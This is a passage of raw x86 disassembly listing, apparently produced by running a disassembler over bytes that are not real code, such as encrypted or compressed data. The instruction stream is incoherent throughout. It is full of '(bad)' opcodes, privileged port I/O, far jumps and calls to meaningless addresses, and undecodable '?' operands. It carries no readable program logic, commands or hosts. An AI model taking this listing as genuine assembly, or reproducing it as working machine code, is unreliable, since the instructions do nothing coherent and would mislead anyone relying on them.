  40713e:	(bad)  
  407140:	ret    0x2a5c
  407143:	cmp    BYTE PTR [ebx],0x79
  407146:	xor    BYTE PTR [ecx],dl
  407148:	clc    
  407149:	mov    dh,0x75
  40714b:	and    al,0x98
  40714d:	cmp    ecx,esi
  40714f:	push   ebp
  407150:	dec    ebx
  407151:	xchg   ebp,esp
  407153:	push   DWORD PTR [ebx]
  407155:	dec    ebp
  407156:	lock push 0xf47bbc79
  40715c:	mov    edi,0xfecacdc8
  407161:	out    0x61,eax
  407163:	imul   DWORD PTR [ecx-0x3d32da54]
  407169:	(bad)
  40716d:	loop   0x40719f
  40716f:	pop    ss
  407170:	add    eax,0x3c228b66
  407175:	xor    al,0xe7
  407177:	call   0x11f2:0xb09e9735
  40717e:	inc    ecx
  40717f:	mov    eax,0x18f8d9d
  407184:	call   0x647440ff
  407189:	aaa    
  40718a:	push   es
  40718b:	pop    esp
  40718c:	fnstenv [esi]
  40718e:	sbb    esp,eax
  407190:	cmp    al,0xf7
  407192:	(bad)  
  407193:	mov    edi,0x9f0a58b3
  407198:	je     0x40713e
  40719a:	xor    DWORD PTR ds:0xf1461a2c,edx
  4071a0:	push   cs
  4071a1:	clc    
  4071a2:	add    ah,BYTE PTR [edi+0x279a46fa]
  4071a8:	(bad)  
  4071a9:	cdq    
  4071aa:	xor    ebx,DWORD PTR [ebx]
  4071ac:	pop    ebp
  4071ad:	in     al,0xea
  4071af:	cmp    ah,dl
  4071b1:	xchg   DWORD PTR [ebp+0x4c],esi
  4071b4:	sbb    ah,BYTE PTR [eax]
  4071b6:	and    dh,BYTE PTR [ebx-0x16]
  4071b9:	or     DWORD PTR [edi-0x27],ebp
  4071bc:	push   0xffffff83
  4071be:	inc    ebx
  4071bf:	repnz dec eax
  4071c1:	pop    ss
  4071c2:	push   ecx
  4071c3:	jg     0x4071a8
  4071c5:	dec    ecx
  4071c6:	leave  
  4071c7:	jecxz  0x40717e
  4071c9:	push   ebp
  4071ca:	jbe    0x40722d
  4071cc:	sbb    bl,BYTE PTR [edx+0x1593b435]
  4071d2:	mov    bh,0x19
  4071d4:	mov    bl,0x8
  4071d6:	dec    ebx
  4071d7:	and    DWORD PTR [ebx-0x722aeeb1],esp
  4071dd:	daa    
  4071de:	(bad)  
  4071df:	and    edi,DWORD PTR [esi+0x7d]
  4071e2:	bound  eax,QWORD PTR [ecx+0x60514d59]
  4071e8:	xlat   BYTE PTR ds:[ebx]
  4071e9:	out    0x97,al
  4071eb:	sub    BYTE PTR [eax+0x47b41b60],dh
  4071f1:	imul   ebx,esp,0x49
  4071f4:	or     al,0xbe
  4071f6:	push   ecx
  4071f7:	sub    DWORD PTR cs:[ebx],esi
  4071fa:	xor    eax,0xa1348242
  4071ff:	popf   
  407200:	neg    DWORD PTR es:[esi-0x2e]
  407204:	cmp    ebx,DWORD PTR [edi]
  407206:	add    BYTE PTR [edi+0x39],bh
  407209:	in     eax,dx
  40720a:	mov    eax,0xa2341195
  40720f:	aam    0x64
  407211:	iret   
  407212:	adc    bl,BYTE PTR [esi-0x6f652750]
  407218:	ds mov al,0x9b
  40721b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40721c:	popf   
  40721d:	stos   DWORD PTR es:[edi],eax
  40721e:	adc    DWORD PTR [ebx-0x3764074f],ebx
  407224:	add    bl,ah
  407226:	shl    BYTE PTR [ebx],cl
  407228:	outs   dx,BYTE PTR ds:[esi]
  407229:	aad    0x3b
  40722b:	inc    edi
  40722c:	adc    dh,bh
  40722e:	sub    DWORD PTR [edi-0x3014e7fe],esi
  407234:	addr16 dec edx
  407236:	jmp    0xbf74:0xda7a3b7a
  40723d:	ret    0x169d
  407240:	push   eax
  407241:	fcomip st,st(3)
  407243:	mov    WORD PTR [ebx],es
  407245:	shr    DWORD PTR [ebx+0x6942649d],cl
  40724b:	push   es
  40724c:	(bad)  
  40724d:	in     eax,0x6b
  40724f:	imul   eax,DWORD PTR cs:[eax+0x7c],0x50
  407254:	je     0x40723a
  407256:	mov    ?,WORD PTR [esi+0x156c1b09]
  40725c:	out    0xf9,al
  40725e:	add    bh,BYTE PTR [edx]
  407260:	sub    eax,0x553de61a
  407265:	inc    esp
  407266:	mov    ebp,0xc2abe500
  40726b:	mov    edi,DWORD PTR [edi-0x38]
  40726e:	outs   dx,DWORD PTR ds:[esi]
  40726f:	dec    ebx
  407270:	add    BYTE PTR [eax+0x1d],al
  407273:	xchg   BYTE PTR [edx],ah
  407275:	jmp    0x490b:0x6ea8e187
  40727c:	jle    0x4072af
  40727e:	mov    dh,0xd6
  407280:	mov    bl,0xb4
  407282:	jle    0x407247
  407284:	pop    edx
  407285:	dec    ebp
  407286:	xchg   edx,eax
  407287:	dec    esi
  407288:	stos   BYTE PTR es:[edi],al
  407289:	fisubr WORD PTR [eax+0x598a24be]
  40728f:	push   esp
  407290:	pop    edx
  407291:	dec    ecx
  407292:	add    ebp,DWORD PTR [edi+0x5a]
  407295:	stos   BYTE PTR es:[edi],al
  407296:	lds    edi,FWORD PTR [ecx+ecx*8+0xef71b86]
  40729d:	cmp    dh,BYTE PTR [eax+ebp*8-0x70]
  4072a1:	mov    bl,0x9c
  4072a3:	jp     0x4072db
  4072a5:	lea    edx,[eax]
  4072a7:	out    0x0,eax
  4072a9:	jmp    0x407252
  4072ab:	mov    ah,0x72
  4072ad:	mov    edx,0x141d255d
  4072b2:	std    
  4072b3:	daa    
  4072b4:	cli    
  4072b5:	neg    DWORD PTR [esi-0x7d]
  4072b8:	scas   eax,DWORD PTR es:[edi]
  4072b9:	test   ah,0xb3
  4072bc:	test   al,0xd0
  4072be:	xchg   esp,eax
  4072bf:	push   ss
  4072c0:	cli    
  4072c1:	push   ebx
  4072c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072c3:	shl    BYTE PTR [ecx],cl
  4072c5:	mov    ecx,0xab152119
  4072ca:	xlat   BYTE PTR ds:[ebx]
  4072cb:	sbb    eax,0x31c78036
  4072d0:	into   
  4072d1:	cwde   
  4072d2:	push   cs
  4072d3:	dec    edi
  4072d4:	dec    esi
  4072d5:	sub    al,0xf6
  4072d7:	mov    ah,cl
  4072d9:	cdq    
  4072da:	ret    0xe896
  4072dd:	jg     0x407340
  4072df:	mov    al,ds:0x3868b8cd
  4072e4:	cli    
  4072e5:	outs   dx,BYTE PTR ds:[esi]
  4072e6:	into   
  4072e7:	test   al,0xee
  4072e9:	loope  0x40732d
  4072eb:	stos   DWORD PTR es:[edi],eax
  4072ec:	int3   
  4072ed:	scas   al,BYTE PTR es:[edi]
  4072ee:	imul   edi,DWORD PTR [ebp-0x3],0xffffffe5
  4072f2:	push   0x67
  4072f4:	push   0xffffffc4
  4072f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072f7:	call   0x965a298d
  4072fc:	cwde   
  4072fd:	out    dx,al
  4072fe:	mov    bl,0x41
  407300:	jae    0x407356
  407302:	mov    ah,0x54
  407304:	mov    eax,ds:0xb88d2e90
  407309:	test   DWORD PTR [edi+0x5b04c532],eax
  40730f:	mov    esi,ds
  407311:	push   eax
  407312:	cs push ds
  407314:	int    0xb9
  407316:	outs   dx,DWORD PTR ds:[esi]
  407317:	jo     0x40736b
  407319:	imul   esi,edi,0xd76d2786
  40731f:	sbb    cl,BYTE PTR [ebx-0x6b5b706a]
  407325:	or     ebx,DWORD PTR [edx]
  407327:	xchg   ebx,eax
  407328:	fmul   DWORD PTR [ebx+0x54]
  40732b:	xor    BYTE PTR [eax+ebx*2],cl
  40732e:	sahf   
  40732f:	jecxz  0x4072b4
  407331:	shl    BYTE PTR [ebx-0x78f24d37],cl
  407337:	sub    al,0x69
  407339:	imul   esp,DWORD PTR [ebx+0x5e],0xffffff84
  40733d:	sbb    esi,edi
  40733f:	arpl   WORD PTR [esi+0x5a],ax
  407342:	gs xchg edx,eax
  407344:	clc    
  407345:	sub    BYTE PTR [edx+0x50],ah
  407348:	sub    al,0x48
  40734a:	cmp    al,BYTE PTR [ecx-0x697455ba]
  407350:	adc    dl,cl
  407352:	pop    ss
  407353:	push   esi
  407354:	inc    esi
  407355:	jge    0x4072dc
  407357:	jmp    0x6b0c:0x89af1762
  40735e:	sbb    al,0x15
  407360:	stos   BYTE PTR es:[edi],al
  407361:	adc    eax,0x6913659b
  407366:	aas    
  407367:	push   ds
  407368:	test   DWORD PTR [edi-0x69987b15],edi
  40736e:	jns    0x407335
  407370:	add    BYTE PTR [esi-0x73],0xf3
  407374:	xchg   dl,dl
  407376:	mov    eax,edi
  407378:	(bad)  
  407379:	shl    BYTE PTR [eax],cl
  40737b:	jb     0x407304
  40737d:	pop    ebp
  40737e:	clc    
  40737f:	dec    ecx
  407380:	dec    edx
  407381:	fcom   QWORD PTR [edi-0x5d070817]
  407387:	push   ecx
  407388:	mov    eax,0xab5d8e3c
  40738d:	fiadd  DWORD PTR [ecx-0x495bcadb]
  407393:	sub    al,0xd5
  407395:	cmp    ecx,DWORD PTR [edx+0x135fa452]
  40739b:	mov    edx,0xfc298874
  4073a0:	iretw  
  4073a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a3:	mov    DWORD PTR [esi+edi*4],edi
  4073a6:	inc    esi
  4073a7:	fidiv  DWORD PTR [ecx-0x2f]
  4073aa:	scas   eax,DWORD PTR es:[edi]
  4073ab:	mov    BYTE PTR [ebx-0x3f],cl
  4073ae:	gs mov ebx,0x5df59dea
  4073b4:	or     al,0x44
  4073b6:	test   BYTE PTR [ebx+eax*4+0x58c20080],0x1d
  4073be:	(bad)  
  4073bf:	int3   
  4073c0:	adc    ecx,edx
  4073c2:	popf   
  4073c3:	pushf  
  4073c4:	std    
  4073c5:	xchg   esi,eax
  4073c6:	stc    
  4073c7:	js     0x407430
  4073c9:	out    0xb6,eax
  4073cb:	adc    dh,dl
  4073cd:	pop    edx
  4073ce:	xchg   BYTE PTR [ebp-0x2e8f3003],ch
  4073d4:	xor    dh,BYTE PTR [eax+0x0]
  4073d7:	mov    esi,0x70d1ea7
  4073dc:	int    0x81
  4073de:	mov    dh,0xfd
  4073e0:	or     ecx,DWORD PTR [ebp+0x4b]
  4073e3:	aaa    
  4073e4:	stc    
  4073e5:	cld    
  4073e6:	dec    ebp
  4073e7:	mov    ch,0x43
  4073e9:	outs   dx,BYTE PTR ds:[esi]
  4073ea:	addr16 icebp 
  4073ec:	mov    edx,0x53f2b361
  4073f1:	js     0x4073db
  4073f3:	in     eax,dx
  4073f4:	fsub   QWORD PTR [ebp-0x21db2fce]
  4073fa:	dec    ecx
  4073fb:	mov    eax,0xb77e7d19
  407400:	inc    eax
  407401:	cwde   
  407402:	adc    ch,0x8e
  407405:	imul   esi,DWORD PTR [edi+eax*8-0x1d9c394d],0xcb6890bb
  407410:	sbb    eax,0xb4f0037b
  407415:	retf   
  407416:	mov    al,ds:0x877c64b5
  40741b:	(bad)  
  40741c:	xor    ebx,DWORD PTR [esi]
  40741e:	xchg   ecx,eax
  40741f:	xchg   DWORD PTR [edi],eax
  407421:	jge    0x407410
  407423:	cmp    al,0x3b
  407425:	push   0x2fdb7e20
  40742a:	xchg   esp,eax
  40742b:	bound  esi,QWORD PTR [edi+0x3d]
  40742e:	mov    bh,0x2d
  407430:	icebp  
  407431:	mov    ?,ebp
  407433:	mov    cl,0x6a
  407435:	pop    esi
  407436:	std    
  407437:	mov    WORD PTR [esp+ecx*4+0x35521461],es
  40743e:	dec    esi
  40743f:	jp     0x4074b2
  407441:	gs loopne 0x4074c3
  407444:	adc    eax,0xbe4744ff
  407449:	cmp    al,0xbd
  40744b:	fnsave [ecx]
  40744d:	std    
  40744e:	mov    al,0x19
  407450:	mov    BYTE PTR [ebx+0x6d9b87ee],dh
  407456:	cmc    
  407457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407458:	aad    0x69
  40745a:	jecxz  0x407461
  40745c:	inc    esi
  40745d:	mov    edx,0xb18a8d89
  407462:	lea    eax,[esi+ebp*8+0x6c8341c1]
  407469:	xor    ah,ah
  40746b:	(bad)  
  40746e:	and    dl,BYTE PTR [edx+0x16]
  407471:	inc    esi
  407472:	das    
  407473:	shr    DWORD PTR [ecx+0x67],cl
  407476:	add    eax,0x83b93c01
  40747b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40747c:	cmp    ebx,DWORD PTR ds:0x9e4a6907
  407482:	ror    BYTE PTR [eax],0x86
  407485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407486:	(bad)  
  407487:	fldenv [edi-0x3c]
  40748a:	dec    edi
  40748b:	push   ebp
  40748c:	nop
  40748d:	sub    al,0xea
  40748f:	sbb    ebp,DWORD PTR [ecx]
  407491:	loop   0x4074aa
  407493:	ficom  DWORD PTR [ecx+0xc]
  407496:	(bad)  
  407497:	sar    DWORD PTR [ebp+0x3f],0xd6
  40749b:	jmp    0xce3bd579
  4074a0:	cmp    al,0x7
  4074a2:	or     bh,al
  4074a4:	aaa    
  4074a5:	fwait
  4074a6:	dec    esp
  4074a7:	and    edx,esp
  4074a9:	jge    0x407478
  4074ab:	pushf  
  4074ac:	push   0xdda6a8ae
  4074b1:	add    BYTE PTR [esi],bl
  4074b3:	loopne 0x40745f
  4074b5:	inc    eax
  4074b6:	das    
  4074b7:	pop    es
  4074b8:	mov    ?,WORD PTR [edx]
  4074ba:	fiadd  WORD PTR ds:[edx+0x1523bb71]
  4074c1:	push   es
  4074c2:	out    dx,eax
  4074c3:	outs   dx,DWORD PTR ds:[esi]
  4074c4:	pop    edx
  4074c5:	ss xor eax,0xae808b72
  4074cb:	cs push ecx
  4074cd:	mov    cl,0xf7
  4074cf:	in     al,dx
  4074d0:	not    ebx
  4074d2:	cmp    eax,0x46e188ae
  4074d7:	mov    dl,BYTE PTR [ebx+0x6d]
  4074da:	dec    edx
  4074db:	add    ch,ah
  4074dd:	mov    cl,0x84
  4074df:	mov    ebp,0xa271ab4f
  4074e4:	xchg   edi,eax
  4074e5:	sub    al,0x77
  4074e7:	pop    esp
  4074e8:	arpl   WORD PTR [eax],di
  4074ea:	sar    DWORD PTR [edx+esi*1],cl
  4074ed:	xor    al,0x74
  4074ef:	mov    al,ds:0xdbe8198
  4074f4:	pop    ds
  4074f5:	cmp    ebp,ecx
  4074f7:	sub    al,0x8b
  4074f9:	fidivr WORD PTR ds:0xecc9cc65
  4074ff:	frstor [esi]
  407501:	jae    0x40755f
  407503:	mov    ebp,0x1b407029
  407508:	cdq    
  407509:	dec    edi
  40750a:	push   eax
  40750b:	bound  ebp,QWORD PTR [edx+eax*2+0x74]
  40750f:	push   ss
  407510:	in     al,dx
  407511:	inc    esi
  407512:	retf   
  407513:	leave  
  407514:	fst    DWORD PTR [ecx]
  407516:	sub    al,0x1d
  407518:	aas    
  407519:	pop    edi
  40751a:	ins    BYTE PTR es:[edi],dx
  40751b:	mov    ebp,0xddfe18f2
  407520:	dec    edi
  407521:	rol    DWORD PTR [ebx-0x71],cl
  407524:	jg     0x40759a
  407526:	gs mov ecx,0x4e946aa3
  40752c:	int3   
  40752d:	les    esp,FWORD PTR [ecx+0xc]
  407530:	or     DWORD PTR [esi+ebx*4+0x65fc1777],esp
  407537:	xchg   DWORD PTR gs:[esi-0x64],esi
  40753b:	xchg   BYTE PTR [edi-0x24],dl
  40753e:	jle    0x40758c
  407540:	lea    ebp,[esi]
  407542:	add    dl,ah
  407544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407545:	xchg   ebx,eax
  407546:	out    dx,eax
  407547:	jno    0x407504
  407549:	or     eax,0x647825b5
  40754e:	cdq    
  40754f:	lahf   
  407550:	aaa    
  407551:	pop    edi
  407552:	or     ebp,ecx
  407554:	cmp    cl,al
  407556:	dec    edx
  407557:	outs   dx,DWORD PTR ds:[esi]
  407558:	call   0x74e3892
  40755d:	ja     0x40751d
  40755f:	adc    DWORD PTR [edx+0x42e78710],0xfffffff0
  407566:	xor    al,0xcf
  407568:	or     al,0x9d
  40756b:	imul   ecx,DWORD PTR [edx],0x4b
  40756e:	mov    esi,0xa087c18d
  407573:	mov    ds:0xa1e7805d,eax
  407578:	out    dx,eax
  407579:	sub    ah,BYTE PTR [ebx]
  40757b:	mov    edi,DWORD PTR [ecx-0x63]
  40757e:	inc    edi
  40757f:	data16 gs jl 0x4075e7
  407583:	nop
  407584:	push   esi
  407585:	or     dl,0x51
  407588:	sbb    BYTE PTR [esi-0x36],0x3e
  40758c:	dec    ebp
  40758d:	into   
  40758e:	jl     0x407608
  407590:	lods   eax,DWORD PTR ds:[esi]
  407591:	mov    esi,0x762fffc6
  407596:	adc    bh,BYTE PTR [edi-0x18]
  407599:	sbb    edi,ebx
  40759b:	or     DWORD PTR [edx],esp
  40759d:	jle    0x4075e1
  40759f:	(bad)  
  4075a0:	mov    ah,0x3
  4075a2:	pop    esi
  4075a3:	mov    ss,WORD PTR [eax]
  4075a5:	lods   al,BYTE PTR ds:[esi]
  4075a6:	mov    bh,0x8f
  4075a8:	out    dx,eax
  4075a9:	push   0xffffff87
  4075ab:	add    edx,ecx
  4075ad:	aas    
  4075ae:	stos   DWORD PTR es:[edi],eax
  4075af:	jae    0x4075aa
  4075b1:	pop    esi
  4075b2:	or     eax,esp
  4075b4:	add    edi,edi
  4075b6:	loop   0x4075a2
  4075b8:	or     dl,BYTE PTR [ecx]
  4075ba:	jp     0x40758d
  4075bc:	mov    esp,0xed87ff25
  4075c1:	in     al,dx
  4075c2:	lahf   
  4075c3:	push   0xfffffff2
  4075c5:	sbb    BYTE PTR [ecx],ah
  4075c7:	mov    edi,DWORD PTR [eax+eiz*2-0x61]
  4075cb:	clc    
  4075cc:	bound  ebx,QWORD PTR [edx+ebp*4+0x67]
  4075d0:	loope  0x4075fa
  4075d2:	cs inc edi
  4075d4:	dec    esp
  4075d5:	test   bl,bl
  4075d7:	and    eax,0x811329cf
  4075dc:	mov    cl,0x9c
  4075de:	(bad)  
  4075df:	in     eax,0x1
  4075e1:	adc    DWORD PTR [eax+0x5],esi
  4075e4:	cmc    
  4075e5:	leave  
  4075e6:	push   ds
  4075e7:	ds cwde 
  4075e9:	mov    DWORD PTR [ebp-0x42],ebx
  4075ec:	imul   DWORD PTR [ecx+0x57]
  4075ef:	xchg   ebp,eax
  4075f0:	mov    ebp,0x5320bfc1
  4075f5:	mov    eax,0x29024298
  4075fa:	ror    BYTE PTR [edi-0x23f4d4b],cl
  407600:	icebp  
  407601:	mov    edi,0xacdbc7ec
  407606:	fdivr  DWORD PTR [edi-0x117d8703]
  40760c:	outs   dx,DWORD PTR ds:[esi]
  40760d:	or     DWORD PTR [ebp-0x4d74e3b0],ebx
  407613:	popa   
  407614:	jnp    0x4075f4
  407616:	sti    
  407617:	fild   WORD PTR [eax+0x52]
  40761a:	or     al,BYTE PTR [ebp-0x11]
  40761d:	arpl   WORD PTR [edi-0x20],cx
  407620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407621:	cmp    ebx,edx
  407623:	jmp    0x2dde:0x940964cb
  40762a:	stos   DWORD PTR es:[edi],eax
  40762b:	adc    DWORD PTR [esi],ebp
  40762d:	test   DWORD PTR [eax+0x40],0x95f0c2d3
  407634:	std    
  407635:	add    edi,esi
  407637:	fwait
  407638:	std    
  407639:	inc    ebp
  40763a:	or     DWORD PTR [ebp-0x4d],ecx
  40763d:	mov    dl,0xf7
  40763f:	out    dx,eax
  407640:	rol    DWORD PTR [esi+eiz*4],0xf3
  407644:	aaa    
  407645:	lds    ecx,FWORD PTR [eax+ebx*4-0x29bb9ba3]
  40764c:	mov    esi,0x1f054fd2
  407651:	rol    DWORD PTR [ebx+ebx*2-0x554109c5],0x74
  407659:	mov    ecx,0x55a97fe5
  40765e:	mov    gs,WORD PTR [edi+0xa352f56]
  407664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407665:	rol    DWORD PTR [edi-0x5a234392],1
  40766b:	std    
  40766c:	mov    cl,0x58
  40766e:	and    eax,0x6760d6c
  407673:	sbb    BYTE PTR [ecx+0x7ef43f09],bh
  407679:	pop    es
  40767a:	fsubr  st(1),st
  40767c:	push   edi
  40767d:	sti    
  40767e:	and    ah,BYTE PTR [eax+0x50]
  407681:	push   esp
  407682:	js     0x4076c8
  407684:	push   edx
  407685:	stos   DWORD PTR es:[edi],eax
  407686:	mov    al,BYTE PTR [ecx-0x2640b19f]
  40768c:	popa   
  40768d:	int    0x8a
  40768f:	and    DWORD PTR [edi-0x18],ecx
  407692:	bound  esi,QWORD PTR [eax+0x5aaf15e6]
  407698:	jo     0x40768d
  40769a:	push   ebx
  40769b:	inc    ecx
  40769c:	fnstenv [ebx-0x44a60d07]
  4076a2:	daa    
  4076a3:	jbe    0x407720
  4076a5:	cdq    
  4076a6:	fs stc 
  4076a8:	xor    esp,DWORD PTR [eax]
  4076aa:	mov    ebx,0x2504fbc8
  4076af:	jmp    0xd3bc:0x8c46248c
  4076b6:	jb     0x4076d8
  4076b8:	pop    ss
  4076b9:	ins    DWORD PTR es:[edi],dx
  4076ba:	inc    ebp
  4076bb:	jmp    0x407707
  4076bd:	aas    
  4076be:	or     BYTE PTR [edx],ch
  4076c0:	xor    al,0x15
  4076c2:	mov    BYTE PTR [esi+0x64],cl
  4076c5:	mov    WORD PTR [edx],?
  4076c7:	cdq    
  4076c8:	ret    0xfc93
  4076cb:	cdq    
  4076cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076cd:	mov    eax,0xa4211047
  4076d2:	mov    bh,BYTE PTR [ebx-0x360a159e]
  4076d8:	adc    BYTE PTR [ebp-0x25],cl
  4076db:	clc    
  4076dc:	or     eax,0xfca681a2
  4076e1:	sbb    eax,0x90f666fc
  4076e6:	ret    0xc562
  4076e9:	mov    ecx,0xfa25dbbd
  4076ee:	xor    edi,DWORD PTR [eax-0x75a201ee]
  4076f4:	cmp    ah,BYTE PTR [ebx]
  4076f6:	nop
  4076f7:	or     ecx,edx
  4076f9:	push   0x5000ae18
  4076fe:	push   eax
  4076ff:	sub    BYTE PTR [ebx-0x62],al
  407702:	dec    eax
  407703:	das    
  407704:	fstp   st(7)
  407706:	mov    ch,0x2f
  407708:	rcr    esi,cl
  40770a:	push   es
  40770b:	pop    ebx
  40770c:	jb     0x40778d
  40770e:	jmp    0x40771b
  407710:	push   0xffffff8e
  407712:	stos   BYTE PTR es:[edi],al
  407713:	ins    DWORD PTR es:[edi],dx
  407714:	push   ebx
  407715:	enter  0x263,0x5c
  407719:	xchg   esp,eax
  40771a:	adc    bl,BYTE PTR [edi]
  40771c:	cld    
  40771d:	nop
  40771e:	jbe    0x407751
  407720:	xchg   ebx,eax
  407721:	mov    DWORD PTR [ebx*1-0x4336c3f1],edi
  407728:	pop    edx
  407729:	xor    eax,DWORD PTR [ebx+0x1f]
  40772c:	xor    ch,BYTE PTR [ecx+0x29]
  40772f:	popa   
  407730:	pop    edi
  407731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407732:	vmwrite esi,edx
  407735:	mov    ebp,0x4f202746
  40773a:	dec    ebx
  40773b:	test   BYTE PTR [esi+0x4ff72cd3],ch
  407741:	addr16 inc eax
  407743:	adc    al,0x4b
  407745:	retf   
  407746:	jle    0x407711
  407748:	pop    esp
  407749:	add    al,0xc9
  40774b:	and    BYTE PTR ds:0xc927d1,0x1c
  407752:	mov    edi,0x9505d305
  407757:	or     cl,BYTE PTR [esi-0x46]
  40775a:	push   cs
  40775b:	dec    esp
  40775c:	xor    al,0x85
  40775e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40775f:	out    dx,al
  407760:	test   eax,0x66e566e0
  407765:	pop    esp
  407766:	cmp    dl,ah
  407768:	les    ecx,FWORD PTR [ebp-0xe]
  40776b:	mov    dh,0x65
  40776d:	ja     0x40773e
  40776f:	imul   eax,ecx,0xffffffc4
  407772:	inc    edx
  407773:	imul   eax,edx,0xffffffef
  407776:	ret    
  407777:	dec    BYTE PTR [ebp+0x44]
  40777a:	cld    
  40777b:	dec    edx
  40777c:	stos   DWORD PTR es:[edi],eax
  40777d:	and    eax,DWORD PTR [ebp-0x5b]
  407780:	or     al,0xda
  407782:	test   al,0x62
  407784:	cmp    ecx,DWORD PTR [ebx]
  407786:	mov    ebx,0xacf56476
  40778b:	jo     0x407715
  40778d:	addr16 int 0x12
  407790:	or     edi,DWORD PTR [esi+0x78]
  407793:	popf   
  407794:	shl    dl,cl
  407796:	dec    ecx
  407797:	xor    ecx,DWORD PTR [ebp+0x2b2cdbb3]
  40779d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779e:	push   cs
  40779f:	jae    0x40781e
  4077a1:	jp     0x4077bd
  4077a3:	jno    0x4077c5
  4077a5:	repz mov WORD PTR [eax],?
  4077a8:	dec    ecx
  4077a9:	sbb    bh,al
  4077ab:	out    0xaf,eax
  4077ad:	inc    ebp
  4077ae:	daa    
  4077af:	adc    edi,DWORD PTR [eax+esi*8+0x61c72eee]
  4077b6:	sbb    ah,BYTE PTR [edi]
  4077b8:	and    BYTE PTR [ebp-0x315c2550],0x56
  4077bf:	fcom   st(4)
  4077c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c2:	sub    eax,esi
  4077c4:	xchg   DWORD PTR [ecx],esi
  4077c6:	push   edx
  4077c7:	jg     0x4077bb
  4077c9:	into   
  4077ca:	adc    cl,dh
  4077cc:	mov    al,0x41
  4077ce:	imul   DWORD PTR [ebx+0x65]
  4077d1:	mov    ch,0x67
  4077d3:	push   ss
  4077d4:	jnp    0x4077b7
  4077d6:	pop    edi
  4077d7:	(bad)  
  4077d8:	xor    eax,0x106337f0
  4077dd:	in     al,0x8
  4077df:	sub    esi,DWORD PTR [esi-0x7341429f]
  4077e5:	adc    al,cl
  4077e7:	ret    
  4077e8:	sbb    ch,BYTE PTR [eax]
  4077ea:	or     DWORD PTR [ebp-0x41],0x64
  4077ee:	xchg   ebx,eax
  4077ef:	mov    ebp,0x43390fa3
  4077f4:	mov    esi,0x8de9bf3e
  4077f9:	xchg   DWORD PTR [ecx+0x6],edi
  4077fc:	scas   al,BYTE PTR es:[edi]
  4077fd:	(bad)  
  4077ff:	or     cl,al
  407801:	mov    edx,0x6be8bed7
  407806:	jns    0x4077a5
  407808:	lds    eax,FWORD PTR [edx+eiz*8]
  40780b:	xor    bh,0xe6
  40780e:	fadd   DWORD PTR [ecx+edi*2]
  407811:	xchg   edi,eax
  407812:	push   edx
  407813:	pop    esp
  407814:	sbb    esi,DWORD PTR [edi-0x6c]
  407817:	jg     0x407855
  407819:	lods   eax,DWORD PTR ds:[esi]
  40781a:	and    BYTE PTR [edi+0x53bb2eec],0x81
  407821:	dec    eax
  407822:	addr16 mov esi,0xff1568ba
  407828:	rcr    BYTE PTR [esi+0x4b5cac5b],0x97
  40782f:	or     BYTE PTR [ebp+0x352e02f],ch
  407835:	ins    BYTE PTR es:[edi],dx
  407836:	retf   
  407837:	push   esi
  407838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407839:	jnp    0x4077ca
  40783b:	sti    
  40783c:	sub    al,0x95
  40783e:	sub    ecx,DWORD PTR [edx+0x36]
  407841:	out    dx,al
  407842:	int    0xd4
  407844:	lods   eax,DWORD PTR ds:[esi]
  407845:	sub    al,0xe0
  407847:	push   es
  407848:	hlt    
  407849:	cmp    DWORD PTR [edi],ecx
  40784b:	std    
  40784c:	repnz outs dx,BYTE PTR ds:[esi]
  40784e:	jae    0x407844
  407850:	pusha  
  407851:	ins    DWORD PTR es:[edi],dx
  407852:	fst    QWORD PTR [esi+0x749425ac]
  407858:	retf   0x6d91
  40785b:	push   ebx
  40785c:	dec    edi
  40785d:	or     al,BYTE PTR [eax-0x60]
  407860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407861:	mov    ebx,0x7999211b
  407866:	inc    ecx
  407867:	(bad)  
  407868:	fbld   TBYTE PTR [edi]
  40786a:	sahf   
  40786b:	adc    si,WORD PTR [edx+0x74]
  40786f:	xchg   edi,eax
  407870:	dec    esp
  407871:	enter  0x5ff3,0x34
  407875:	jbe    0x4078e2
  407877:	mov    ah,0x7a
  407879:	int    0xd
  40787b:	ins    BYTE PTR es:[edi],dx
  40787c:	call   0x4964cec4
  407881:	xor    al,0x2c
  407883:	jmp    0xcf52:0x579b7ad
  40788a:	dec    edx
  40788b:	test   eax,0xc741efa
  407890:	sahf   
  407891:	ja     0x407831
  407893:	xchg   edi,eax
  407894:	jae    0x407895
  407896:	out    0x81,eax
  407898:	jns    0x40783b
  40789a:	icebp  
  40789b:	aam    0xf6
  40789d:	or     edi,DWORD PTR [edx+0x14]
  4078a0:	sub    dl,al
  4078a2:	mov    eax,ds:0x7cd20570
  4078a7:	pop    edi
  4078a8:	jb     0x4078b2
  4078aa:	cmp    eax,0x7e5db622
  4078af:	pushf  
  4078b0:	and    esi,DWORD PTR [ecx+0x53]
  4078b3:	arpl   WORD PTR [edi],ax
  4078b5:	test   dl,cl
  4078b7:	aas    
  4078b8:	out    0xe3,eax
  4078ba:	push   0x8683f15c
  4078bf:	add    ch,BYTE PTR [edx+0x52]
  4078c2:	mov    ebx,0x6d5c995e
  4078c7:	or     BYTE PTR [ecx+0x42],cl
  4078ca:	and    DWORD PTR [ecx+0x514d4231],esp
  4078d0:	inc    esi
  4078d1:	lea    edi,[esi+ebx*4]
  4078d4:	push   eax
  4078d5:	mov    al,0x92
  4078d7:	fsubr  QWORD PTR [edx]
  4078d9:	retf   
  4078da:	(bad)  
  4078db:	call   0xbb91:0xbbe3e978
  4078e2:	clc    
  4078e3:	aas    
  4078e4:	xchg   ebp,eax
  4078e5:	xchg   BYTE PTR [ebx],al
